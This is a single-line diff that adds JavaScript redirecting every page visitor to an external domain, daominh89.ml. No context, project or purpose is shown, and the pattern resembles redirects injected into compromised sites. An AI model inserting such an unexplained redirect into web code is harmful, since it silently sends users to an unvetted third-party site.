@@ -1,0 +1,1 @@
+window.location.replace("https://www.daominh89.ml");
